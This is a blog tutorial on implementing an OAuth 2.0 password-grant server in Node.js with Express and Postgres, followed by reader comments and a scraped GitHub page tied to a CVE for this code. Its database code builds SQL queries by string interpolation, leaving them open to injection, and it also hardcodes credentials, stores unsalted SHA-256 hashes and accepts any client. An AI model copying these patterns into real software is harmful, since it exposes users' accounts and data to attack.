***Editor’s note**: This article was last updated on 6 April 2022 to reflect the most up-to-date versions of Express and Node.js.*

![How Implement 0auth2 Nodejs](https://blog.logrocket.com/wp-content/uploads/2020/05/how-to-implement-0auth2-nodejs.png)

Everybody’s talking about [OAuth 2.0](https://oauth.net/2/). Regardless of the size of the company you work for or the number of services and APIs you’re running in the background, there’s a good chance you need OAuth 2.0 if you aren’t already using it.

Given the huge amount of information, tools, and frameworks available, it can be really hard to understand and easily apply the protocol to your projects. When it comes to JavaScript, and more specifically, Node.js, it also depends on factors like the server you’re choosing and whether it already provides OAuth 2.0 support. It’s also important to consider the maturity of the project, the docs, and the community.

We can simplify this issue with [node-oauth2-server](https://github.com/oauthjs/node-oauth2-server), a framework-agnostic module for implementing an OAuth 2 server in Node.js. node-oauth2-server is open sourced, simple, and easy to integrate with your Node apps, even if they’ve already been running for a while.

Although the repo hasn’t been updated for some time, it is still completely compatible with the latest Node.js standards at the time of writing.

In this article, we’ll explore the OAuth 2 framework by developing our own overwritten implementation and testing it through a real API. We’ll also integrate it with a Postgres database to see the project in action, blocking and allowing access to a specific endpoint.

For simplicity, our example will explore the [password grant type](https://oauth.net/2/grant-types/password/) of OAuth 2. Based on this example, you can adapt the implementation to other types. You can review [the full source code for this example](https://github.com/atharvadeosthale/logrocket-oauth2-article). Let’s get started!

* [About OAuth 2.0](#about-oauth-2)
* [Setting up our project](#setting-up-project)
* [Database layer](#database-layer)
* [OAuth 2.0 service and routes](#oauth2-service-routes)
  + [Creating a new user via Postman](#creating-new-user-postman)
  + [Login created user via Postman](#login-created-user-postman)
  + [Postman Authorization tab](#postman-authorization-tab)
* [Conclusion](#conclusion)

## About OAuth 2.0

Within its docs, you can find the official [Model Specification](https://oauth2-server.readthedocs.io/en/latest/model/spec.html) that describes how your JavaScript code must override the default OAuth 2 functions to provide your customized authentication experience:

```
const model = {
  // We support returning promises.
  getAccessToken: function() {
    return new Promise('works!');
  },

  // Or, calling a Node-style callback.
  getAuthorizationCode: function(done) {
    done(null, 'works!');
  },

  // Or, using generators.
  getClient: function*() {
    yield somethingAsync();
    return 'works!';
  },

  // Or, async/wait (using Babel).
  getUser: async function() {
    await somethingAsync();
    return 'works!';
  }
};

const OAuth2Server = require('oauth2-server');
let oauth = new OAuth2Server({model: model});

```

With the OAuth2Server object in hand, you can override the default OAuth 2 provider of your Express server, enabling you to provide your own authentication experience. For more info on how the framework works behind the scenes, please refer to the [official docs](https://oauth2-server.readthedocs.io/en/latest/docs/getting-started.html).

## Setting up our project

First, let’s install all the required tools and dependencies for our project. Make sure you have [Postgres installed](https://www.postgresql.org/) on your respective OS. After you’ve successfully installed Postgres, create a new database called `logrocket_oauth2` with the following command:

```
CREATE DATABASE logrocket_oauth2;

```

To create our user and access token tables, run the following SQL command:

```
CREATE TABLE public.users
(
    id serial,
    username text,
    user_password text,
    PRIMARY KEY (id)
)
WITH (
    OIDS = FALSE
);

ALTER TABLE public.users
    OWNER to postgres;

CREATE TABLE public.access_tokens
(
    id serial,
    access_token text,
    user_id integer,
    PRIMARY KEY (id)
)
WITH (
    OIDS = FALSE
);

ALTER TABLE public.access_tokens
    OWNER to postgres;

```

Make sure you replace `postgres` with your own Postgres username. We’ve mostly simplified the tables, so in this article, we won’t cover columns related to creating to updating date times.

Next, create a new folder in the directory of your choice called `logrocket-oauth2-example` and run the `npm init -y` command to initialize it with your `package.json` file. Then, run the following command to install the required dependencies:

```
npm install express pg node-oauth2-server

```

We use Express to create REST APIs, pg, short for node-postgres, to connect our Node.js server to PostgreSQL, and finally, `node-oauth2-server` to provide relevant utilities that help us make the OAuth 2 server.

If you prefer, you can also run the commands using Yarn with the code below:

```
yarn add express pg node-oauth2-server

```

Finally, be sure to reproduce the following folder structure:

![Oauth2 Folder Structure Node](https://blog.logrocket.com/wp-content/uploads/2022/03/oauth2-folder-structure-node.png)

## Database layer

Now, let’s move on to the database setup. After you’ve successfully created the database and tables, we’ll need a Postgres wrapper to encapsulate the queries we’ll make in the `db` folder. Inside the `db` folder, add the following code to the `pgWrapper.js` file:

```
const Pool = require("pg").Pool;
function query(queryString, cbFunc) {
  const pool = new Pool({
    user: "postgres",
    host: "localhost",
    database: "logrocket_oauth2",
    password: "postgres",
    port: 5432,
  });
  pool.query(queryString, (error, results) => {
    cbFunc(setResponse(error, results));
  });
}
function setResponse(error, results) {
  return {
    error: error,
    results: results ? results : null,
  };
}
module.exports = {
  query,
};

```

The most important part of this code is the `query()` function. Instead of throwing the Postgres connection pool object everywhere, we’re going to centralize it in this file and export the function.

It’s pretty simple. The `query()` function is made of a new pg `Pool` instance and a callback function that, in turn, will always receive a JSON object composed of `error` and `results` properties. Let’s keep `results` as an array for simplicity.

> Note: Be sure to change the database properties to yours.

Next, we’ll need two repositories that will handle the database operations for both users and tokens. The first one will be the `userDB.js` file:

```
let pgPool;

module.exports = (injectedPgPool) => {
    pgPool = injectedPgPool;

    return {
        register,
        getUser,
        isValidUser,
    };
};

var crypto = require("crypto");

function register(username, password, cbFunc) {
    var shaPass = crypto.createHash("sha256").update(password).digest("hex");

    const query = `INSERT INTO users (username, user_password) VALUES ('${username}', '${shaPass}')`;

    pgPool.query(query, cbFunc);
}

function getUser(username, password, cbFunc) {
    var shaPass = crypto.createHash("sha256").update(password).digest("hex");

    const getUserQuery = `SELECT * FROM users WHERE username = '${username}' AND user_password = '${shaPass}'`;

    pgPool.query(getUserQuery, (response) => {
        cbFunc(
            false,
            response.results && response.results.rowCount === 1
                ? response.results.rows[0]
                : null
        );
    });
}

function isValidUser(username, cbFunc) {
    const query = `SELECT * FROM users WHERE username = '${username}'`;

    const checkUsrcbFunc = (response) => {
        const isValidUser = response.results
            ? !(response.results.rowCount > 0)
            : null;

        cbFunc(response.error, isValidUser);
    };

    pgPool.query(query, checkUsrcbFunc);
}

```

Our database model is going to resume three operations, the registration, searching, and validation of a user.

Note that we’re injecting the `pgPool` in the beginning of the file that we created before. For this code to work, we still need to pass the param to the constructor in the `index.js` file.

Each function deals with our previously created `query` function. [The npm pg package](https://www.npmjs.com/package/pg) receives the query itself as the first argument. The `error-results` composition is the second argument, which contains the result of our execution.

We’re injecting the params via the `${}` operator to simplify the concatenation. However, you can also use [parameterized queries](https://node-postgres.com/features/queries) by passing the values as an array in the second optional argument of the `query` function.

Finally, the pg package returns the values in the `results` object, but there isn’t any `length` property, which differs from other databases like MySQL.

---

[![](https://blog.logrocket.com/wp-content/uploads/2022/11/Screen-Shot-2022-09-08-at-6.20.35-PM.png)

## Over 200k developers use LogRocket to create better digital experiences

![](https://blog.logrocket.com/wp-content/uploads/2022/08/rocket-button-icon.png)Learn more →](https://lp.logrocket.com/blg/learn-more)

---

To see if any results are coming, we need to access the `rowCount` property. Note that we’re passing around a lot of callback functions to avoid having the control under the function returns, making the whole architecture async. Feel free to adapt this to your own style.

Now, let’s go to the `tokenDB.js` implementation:

```
let pgPool;

module.exports = (injectedPgPool) => {
    pgPool = injectedPgPool;

    return {
        saveAccessToken,
        getUserIDFromBearerToken,
    };
};

function saveAccessToken(accessToken, userID, cbFunc) {
    const getUserQuery = `INSERT INTO access_tokens (access_token, user_id) VALUES ('${accessToken}', ${userID});`;

    pgPool.query(getUserQuery, (response) => {
        cbFunc(response.error);
    });
}

function getUserIDFromBearerToken(bearerToken, cbFunc) {
    const getUserIDQuery = `SELECT * FROM access_tokens WHERE access_token = '${bearerToken}';`;

    pgPool.query(getUserIDQuery, (response) => {
        const userID =
            response.results && response.results.rowCount == 1
                ? response.results.rows[0].user_id
                : null;

        cbFunc(userID);
    });
}

```

Like in our previous JavaScript file, we’re injecting the pg `Pool` in the constructor and calling the respective queries.

Pay special attention to the `getUserIDFromBearerToken` function. Attending to the default `node-oauth2-server` model contract, we need to provide a function that will evaluate if the given bearer token is actually valid, meaning that the token actually exists in the database.

Thanks to the previous `isValidUser` from `userDB.js`, which checks for username duplicity when inserting a new user, our token will work.

## OAuth 2.0 service and routes

Now that the database layer is ready to be called, let’s implement the services and routes we need, starting with the `tokenService.js` file:

```
let userDB;
let tokenDB;

module.exports = (injectedUserDB, injectedTokenDB) => {
    userDB = injectedUserDB;
    tokenDB = injectedTokenDB;

    return {
        getClient,
        saveAccessToken,
        getUser,
        grantTypeAllowed,
        getAccessToken,
    };
};

function getClient(clientID, clientSecret, cbFunc) {
    const client = {
        clientID,
        clientSecret,
        grants: null,
        redirectUris: null,
    };

    cbFunc(false, client);
}

function grantTypeAllowed(clientID, grantType, cbFunc) {
    cbFunc(false, true);
}

function getUser(username, password, cbFunc) {
    userDB.getUser(username, password, cbFunc);
}

function saveAccessToken(accessToken, clientID, expires, user, cbFunc) {
    tokenDB.saveAccessToken(accessToken, user.id, cbFunc);
}

function getAccessToken(bearerToken, cbFunc) {
    tokenDB.getUserIDFromBearerToken(bearerToken, (userID) => {
        const accessToken = {
            user: {
                id: userID,
            },
            expires: null,
        };

        cbFunc(userID === null, userID === null ? null : accessToken);
    });
}

```

It sounds a bit more complex than it actually is. All of these functions are simply overwritten versions of the Model Specification contract we saw earlier.

For each of its default actions, we need to provide our own implementation that calls our database repository to save a new user, as well as a new access token to retrieve them or get the client application.

For the `grantTypeAllowed` function, we’re actually just recalling the callback function passed as a third argument, passed by the `node-oauth2-server` framework.

---

### More great articles from LogRocket:

* Don't miss a moment with [The Replay](https://lp.logrocket.com/subscribe-thereplay), a curated newsletter from LogRocket
* [Learn](https://blog.logrocket.com/rethinking-error-tracking-product-analytics/) how LogRocket's Galileo cuts through the noise to proactively resolve issues in your app
* Use React's useEffect [to optimize your application's performance](https://blog.logrocket.com/understanding-react-useeffect-cleanup-function/)
* Switch between [multiple versions of Node](https://blog.logrocket.com/switching-between-node-versions-during-development/)
* [Discover](https://blog.logrocket.com/using-react-children-prop-with-typescript/)  how to use the React children prop with TypeScript
* [Explore](https://blog.logrocket.com/creating-custom-mouse-cursor-css/) creating a custom mouse cursor with CSS
* Advisory boards aren’t just for executives. [Join LogRocket’s Content Advisory Board.](https://lp.logrocket.com/blg/content-advisory-board-signup) You’ll help inform the type of content we create and get access to exclusive meetups, social accreditation, and swag.

---

We validate if the given client ID has real access to this grant type, set to password only. You can add as many validations as you want. We can also integrate it with other private validation APIs that you or your company may have.

Now, let’s review the `authenticator.js` file code:

```
let userDB;

module.exports = (injectedUserDB) => {
    userDB = injectedUserDB;

    return {
        registerUser,
        login,
    };
};

function registerUser(req, res) {
    userDB.isValidUser(req.body.username, (error, isValidUser) => {
        if (error || !isValidUser) {
            const message = error
                ? "Something went wrong!"
                : "This user already exists!";

            sendResponse(res, message, error);

            return;
        }

        userDB.register(req.body.username, req.body.password, (response) => {
            sendResponse(
                res,
                response.error === undefined ? "Success!!" : "Something went wrong!",
                response.error
            );
        });
    });
}

function login(query, res) {}

function sendResponse(res, message, error) {
    res.status(error !== undefined ? 400 : 200).json({
        message: message,
        error: error,
    });
}

```

In the code above, we have the two main authentication methods, one for the user registration and the other for the user login. Whenever an attempt to register a user is made, we first need to make sure it’s valid, meaning it’s not a duplicate, then register it.

We’ve already seen the validation and saving functions. Now, it’s just a single call. In turn, the `login` function doesn’t need to have any implementation because it’s going to call the framework default flow. In the end, check for whether we had an error or a success for each request so that we can set the proper HTTP response code.

Finally, we need to set up our Express routes in the `routes.js` file:

```
module.exports = (router, app, authenticator) => {
    router.post("/register", authenticator.registerUser);
    router.post("/login", app.oauth.grant(), authenticator.login);

    return router;
};

```

Simple, isn’t it? The only difference is that we’re calling the Express `oauth` function `grant()` to make sure this user is logged in properly. To assure that the implementation is fully working, we’ll also need a safe test endpoint. It’ll be created like any other endpoint, but protected, meaning that only authorized users can have access to it by sending a valid bearer token.

Add the following code to our `testAPIService.js`:

```
module.exports = {
    helloWorld: helloWorld,
};

function helloWorld(req, res) {
    res.send("Hello World OAuth2!");
}

```

Now, add the code below to the `testAPIRoutes.js`:

```
module.exports = (router, app, testAPIService) => {
    router.post("/hello", app.oauth.authorise(), testAPIService.helloWorld);

    return router;
};

```

Last but not least, we need to set up the `index.js` mappings:

```
// Database imports
const pgPool = require("./db/pgWrapper");
const tokenDB = require("./db/tokenDB")(pgPool);
const userDB = require("./db/userDB")(pgPool);
// OAuth imports
const oAuthService = require("./auth/tokenService")(userDB, tokenDB);
const oAuth2Server = require("node-oauth2-server");
// Express
const express = require("express");
const app = express();
app.oauth = oAuth2Server({
    model: oAuthService,
    grants: ["password"],
    debug: true,
});
const testAPIService = require("./test/testAPIService.js");
const testAPIRoutes = require("./test/testAPIRoutes.js")(
    express.Router(),
    app,
    testAPIService
);
// Auth and routes
const authenticator = require("./auth/authenticator")(userDB);
const routes = require("./auth/routes")(
    express.Router(),
    app,
    authenticator
);
app.use(express.json())
app.use(express.urlencoded({ extended: true }));
app.use(app.oauth.errorHandler());
app.use("/auth", routes);
app.use("/test", testAPIRoutes);
const port = 3000;
app.listen(port, () => {
    console.log(`listening on port ${port}`);
});

```

We’re basically importing all the required modules, as well as injecting the corresponding ones into each other.

Pay special attention to the Express settings. Notice that we’re overwriting the default `oauth` object of Express with our own implementation, as well as defining the grant type and the model service.

Then, we must assign the routes for the authenticator and the tests to the Express Router so that Express understands how to redirect each of the approaching requests.

Now, let’s test our endpoints. We’ll use the [Postman tool](https://www.postman.com/) because it’s simple and practical, however, you should feel free to use one of your choice. Then, start the server by running the following code:

```
node index.js

```

First, we need to create a new user. To do so, perform a `POST` request to `http://localhost:3000/auth/register/` with the following body params encoded as `x-www-form-urlencoded`:

![Postman Create New User Endpoints](https://blog.logrocket.com/wp-content/uploads/2022/03/postman0create-new-user-endpoints.png)

### Creating a new user via Postman

Go ahead and check if the user was successfully created in your database.

With a valid user in hand, you can now log in by sending another `POST` request to `http://localhost:3000/auth/login/` with the following body params:

![Check User Created Success](https://blog.logrocket.com/wp-content/uploads/2022/03/check-user-created-success.png)

### Login created user in via Postman

If you change the credentials to invalid ones, you’ll get a message reading `OAuth2Error: User credentials are invalid`.

Now, with OAuth 2 implemented and working, we can run our most important test, validating our secure endpoint. Postman provides us with special features to test this, the Authorization tab:

![Postman Authorization Tab](https://blog.logrocket.com/wp-content/uploads/2022/03/postman-authorization-tab.png)

### Postman Authorization tab

By selecting the **Authorization** tab, you get access to some interesting test features, like the type of authorization flow your API is using, which is `OAuth 2.0` in our case.

You’ll also be able to choose where exactly Postman should place the authorization data. For example, select the **header** option to place the authorization data to the request header or body.

Additionally, you have two options of where to retrieve the access tokens. You can explicitly drop the token text into the available `textarea`, or click the **Get NewAccess Token** button that will, in turn, open a dialog modal with some more fields. Those fields will ask for the access token URL endpoint to get new ones, the TTL, grant type, etc.

Here, you can preview the request. After clicking the button, the inputted values will be automatically translated to the header and body configurations of the current request. This way, you don’t have to manually change each header every time you need to run a new request.

Click the **Send button** and the `Hello World OAuth2` will appear as a result.

## Conclusion

This framework is just one of the options available out there. You can go to the [OAuth.net](https://oauth.net/code/nodejs/) project and check out the latest recommendations for Node.js and your preferred language as well. Of course, there’s a lot to see.

OAuth 2.0 is a huge protocol that deserves more time and attention when reading and applying its specifications. However, this simple introduction will allow you to understand how the framework works along with Express and Postgres.

You can also change the server and the database to switch your needs. Just make sure to use the same contract we’ve established so far. I hope you enjoyed this article. Happy coding!

## 200s only Monitor failed and slow network requests in production

Deploying a Node-based web app or website is the easy part. Making sure your Node instance continues to serve resources to your app is where things get tougher. If you’re interested in ensuring requests to the backend or third-party services are successful, [try LogRocket](https://lp.logrocket.com/blg/node-signup).

[![LogRocket Network Request Monitoring](https://blog.logrocket.com/wp-content/uploads/2019/12/network-request-filter-2-1.png)](https://lp.logrocket.com/blg/node-signup)

[LogRocket](https://lp.logrocket.com/blg/node-signup) is like a DVR for web and mobile apps, recording literally everything that happens while a user interacts with your app. Instead of guessing why problems happen, you can aggregate and report on problematic network requests to quickly understand the root cause.

LogRocket instruments your app to record baseline performance timings such as page load time, time to first byte, slow network requests, and also logs Redux, NgRx, and Vuex actions/state. [Start monitoring for free](https://lp.logrocket.com/blg/node-signup).

### Share this:

* [Click to share on Twitter (Opens in new window)](https://blog.logrocket.com/implement-oauth-2-0-node-js/?share=twitter "Click to share on Twitter")
* [Click to share on Reddit (Opens in new window)](https://blog.logrocket.com/implement-oauth-2-0-node-js/?share=reddit "Click to share on Reddit")
* [Click to share on LinkedIn (Opens in new window)](https://blog.logrocket.com/implement-oauth-2-0-node-js/?share=linkedin "Click to share on LinkedIn")
* [Click to share on Facebook (Opens in new window)](https://blog.logrocket.com/implement-oauth-2-0-node-js/?share=facebook "Click to share on Facebook")

* [#node](https://blog.logrocket.com/tag/node/)

Would you be interested in joining LogRocket's developer community?

Yea
No Thanks

Join LogRocket’s Content Advisory Board. You’ll help inform the type of
content we create and get access to exclusive meetups, social accreditation,
and swag.

[Sign up now](https://lp.logrocket.com/blg/content-advisory-board-signup)

![](https://blog.logrocket.com/wp-content/uploads/2022/06/footer-cta-dots-left.png)
![](https://blog.logrocket.com/wp-content/uploads/2022/06/footer-cta-dots-right.png)
![](https://blog.logrocket.com/wp-content/uploads/2022/09/logrocket-logo-frontend-analytics.png)
## Stop guessing about your digital experience with LogRocket

[Get started for free](https://lp.logrocket.com/blg/signup)

#### Recent posts:

[![building UI sixty seconds shadcn framer ai](https://blog.logrocket.com/wp-content/uploads/2025/01/1.14_BuildingUIShadCNFramer.png?w=420)
#### Building a UI in 60 seconds with Shadcn and Framer AI](https://blog.logrocket.com/building-ui-60-seconds-shadcn-framer-ai/)

Demand for faster UI development is skyrocketing. Explore how to use Shadcn and Framer AI to quickly create UI components.

[![](https://blog.logrocket.com/wp-content/uploads/2022/01/unnamed-1.jpg?w=150&h=150&crop=1)](https://blog.logrocket.com/author/peteraideloje/)
[Peter Aideloje](https://blog.logrocket.com/author/peteraideloje/)
Jan 14, 2025 ⋅ 6 min read

[![Server-Side Rendering With React Router V7](https://blog.logrocket.com/wp-content/uploads/2025/01/server-side-rendering-react-router-v7.png?w=420)
#### Server-side rendering with React Router v7](https://blog.logrocket.com/server-side-rendering-react-router-v7/)

The recent merge of Remix and React Router in React Router v7 provides a full-stack framework for building modern SSR and SSG applications.

[![](https://blog.logrocket.com/wp-content/uploads/2023/08/PSX_20220311_170637.jpg?w=150&h=150&crop=1)](https://blog.logrocket.com/author/amazingenyichiagu/)
[Amazing Enyichi Agu](https://blog.logrocket.com/author/amazingenyichiagu/)
Jan 13, 2025 ⋅ 20 min read

[![debugging javascript web apps](https://blog.logrocket.com/wp-content/uploads/2025/01/1.9_DebuggingJavaScriptWebApps.png?w=420)
#### How to master JavaScript debugging for web apps](https://blog.logrocket.com/master-javascript-debugging-web-apps/)

With the right tools and strategies, JavaScript debugging can become much easier. Explore eight strategies for effective JavaScript debugging, including source maps and other techniques using Chrome DevTools.

[![](https://blog.logrocket.com/wp-content/uploads/2021/10/ivywalobwa.jpg?w=150&h=150&crop=1)](https://blog.logrocket.com/author/ivywalobwa/)
[Ivy Walobwa](https://blog.logrocket.com/author/ivywalobwa/)
Jan 9, 2025 ⋅ 8 min read

[![A Deep Dive Into Angular’s FormArray Container](https://blog.logrocket.com/wp-content/uploads/2025/01/deep-dive-angular-formarray-container-nocdn.png?w=420)
#### A deep dive into Angular’s FormArray container](https://blog.logrocket.com/deep-dive-angular-formarray-container/)

This Angular guide demonstrates how to create a pseudo-spreadsheet application with reactive forms using the `FormArray` container.

[![](https://secure.gravatar.com/avatar/8b234f3a926fc733e09ed4c0eaa904d2?s=50&d=mm&r=g)](https://blog.logrocket.com/author/kayodeadeniyi/)
[Kayode Adeniyi](https://blog.logrocket.com/author/kayodeadeniyi/)
Jan 8, 2025 ⋅ 3 min read

[View all posts](https://blog.logrocket.com/)

#### 12 Replies to "How to implement OAuth 2.0 in Node.js"

2. ![](https://secure.gravatar.com/avatar/e40cea6efb01b216f132d4b9c5f7baf2?s=36&d=mm&r=g) **pichu** says:
   [June 11, 2020 at 12:01 am](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-2806)

   HI , I getting “OAuth2Error: User credentials are invalid” . I am sure that both user name and password correct

   [Reply](#comment-2806)
4. ![](https://graph.facebook.com/v6.0/2830281383872350/picture?type=large&_md5=7d484ce09fa637261db63a772477e82d) **Thura Aung** says:
   [July 17, 2020 at 4:23 am](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-3190)

   Very straight forward and effective. Thank you very much.

   [Reply](#comment-3190)
6. ![](https://secure.gravatar.com/avatar/e2df17e7740b50369105de1975629970?s=36&d=mm&r=g) **[Raul](https://github.com/raulcejas04)** says:
   [December 27, 2020 at 9:42 pm](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-4721)

   Hi, I am in the “most important test” <http://localhost:3000/test/hello> and I get error because new version of postman is a bit different. Can you post a curl script with all paramaters please ?

   [Reply](#comment-4721)
8. ![](https://secure.gravatar.com/avatar/e2df17e7740b50369105de1975629970?s=36&d=mm&r=g) **[raul](https://www.github.com/raulcejas04)** says:
   [December 28, 2020 at 4:24 pm](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-4730)

   I hope it can help somebody, to test <http://localhost:3000/test/hello> you must use postman 7.36.1 and the code to test it is

   put token that you get in the previous step.

   [Reply](#comment-4730)
10. ![](https://secure.gravatar.com/avatar/2e275971f25448752e21051b247576b4?s=36&d=mm&r=g) **[octogonz](http://octogonz.wordpress.com)** says:
    [May 19, 2021 at 2:29 pm](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-6844)

    This is a string injection security vulnerability:

    \_\_\_\_\_\_\_\_\_\_\_

    function getUserIDFromBearerToken(bearerToken, cbFunc) {

    const getUserIDQuery = `SELECT \* FROM access\_tokens WHERE access\_token = ‘${bearerToken}’;`;

    \_\_\_\_\_\_\_\_\_\_\_

    Don’t use this code. Parameterized SQL queries are the reliable way to escape a string.

    [Reply](#comment-6844)
12. ![](https://secure.gravatar.com/avatar/3404dca55fdb04df521943925842b2c5?s=36&d=mm&r=g) **[Abel Lifaefi Mbula](https://abelmbula.com)** says:
    [December 17, 2021 at 11:55 am](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-9484)

    Hey!

    Thank you for your effort and time writing this post. However, the post is a kind of bad example of OAuth 2.0 protocol that we find on the web. We should notice that OAuth 2.0 is an authorization protocol, not an authentication one, although many developers try to use it for that purpose.

    You can find the spec here: <https://oauth.net/2/>. Some useful links to visit:

    \* <https://dev.to/kimmaida/authorization-and-authentication-for-everyone-27j3>

    \* <https://newbedev.com/why-is-it-a-bad-idea-to-use-plain-oauth2-for-authentication>

    \* <https://auth0.com/docs/authorization/protocols/protocol-oauth2>

    \* <https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2>

    \* <https://dev.to/bam92/oauth-2-spec-is-misunderstood-why-14jd>

    [Reply](#comment-9484)
14. ![](https://secure.gravatar.com/avatar/9f5c5a5ac24a393fb07aca6832a7ac1a?s=36&d=mm&r=g) **[Gaurav Gupta (@gaurav5430)](https://twitter.com/gaurav5430)** says:
    [October 19, 2022 at 2:06 pm](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-30821)

    What do you mean that login would be handled by the framework default flow?

    [Reply](#comment-30821)
    1. ![](https://secure.gravatar.com/avatar/8a02c5ccf4eaaac80077816791200462?s=36&d=mm&r=g) **Jose Jaimes** says:
       [January 9, 2023 at 5:44 am](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-32449)

       The effort you did to create this content is considerable but it’s really important to take note of this:

       “This implements the password credential grant. The error should be JSON as well (currently HTML). Please note, that the password credential grant is not the recommended way to do OAuth – consider using the authorization code grant.”

       [Reply](#comment-32449)
16. ![](https://secure.gravatar.com/avatar/b92a863aa4be82c1d527f85fbce9e0ff?s=36&d=mm&r=g) **Andrew** says:
    [May 24, 2023 at 4:51 am](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-35588)

    the library hasn`t been updated for 3 years..

    [Reply](#comment-35588)
18. ![](https://secure.gravatar.com/avatar/b92a863aa4be82c1d527f85fbce9e0ff?s=36&d=mm&r=g) **Andrew** says:
    [June 9, 2023 at 9:18 am](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-35850)

    I tried to rewrite for MySQL. I reated user successfully but I had not had any success with the “/login” route:

    OAuth2Error: User credentials are invalid

    at OAuth2Error (d:\web-work\oa2\logrocket-oauth2-example\node\_modules\node-oauth2-server\lib\error.js:30:12)

    at d:\web-work\oa2\logrocket-oauth2-example\node\_modules\node-oauth2-server\lib\grant.js:228:19

    at d:\web-work\oa2\logrocket-oauth2-example\db\userDB.js:29:9

    at Query.onResult (d:\web-work\oa2\logrocket-oauth2-example\db\pgWrapper.js:37:9)

    at d:\web-work\oa2\logrocket-oauth2-example\node\_modules\mysql2\lib\commands\query.js:86:16

    at processTicksAndRejections (node:internal/process/task\_queues:78:11)

    [Reply](#comment-35850)
20. ![](https://secure.gravatar.com/avatar/0efc86723fd3a1adf66008613be64aad?s=36&d=mm&r=g) **Hengki** says:
    [August 7, 2023 at 3:09 am](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-36831)

    OAuth2Error: Method must be POST with application/x-www-form-urlencoded encoding

    I want to send payload as Content-Type: application/json

    [Reply](#comment-36831)
    1. ![](https://secure.gravatar.com/avatar/f8f7ab3ab4a571111a1c8e1ffd8d40d6?s=36&d=mm&r=g) **Ayushman** says:
       [November 28, 2023 at 1:38 pm](https://blog.logrocket.com/implement-oauth-2-0-node-js/#comment-38103)

       Any solution to this

       [Reply](#comment-38103)

### Leave a Reply[Cancel reply](/implement-oauth-2-0-node-js/#respond)

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###



=== Content from github.com_f102731e_20250115_093822.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecoats%2Fcve%2Ftree%2Fmaster%2FCVE-2022-38488_sqli_logrocket-oauth2-example)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecoats%2Fcve%2Ftree%2Fmaster%2FCVE-2022-38488_sqli_logrocket-oauth2-example)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=secoats%2Fcve)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[secoats](/secoats)
/
**[cve](/secoats/cve)**
Public

* [Notifications](/login?return_to=%2Fsecoats%2Fcve) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fsecoats%2Fcve)
* [Star
   0](/login?return_to=%2Fsecoats%2Fcve)

* [Code](/secoats/cve)
* [Issues
  0](/secoats/cve/issues)
* [Pull requests
  0](/secoats/cve/pulls)
* [Actions](/secoats/cve/actions)
* [Projects
  0](/secoats/cve/projects)
* [Security](/secoats/cve/security)
* [Insights](/secoats/cve/pulse)

Additional navigation options

* [Code](/secoats/cve)
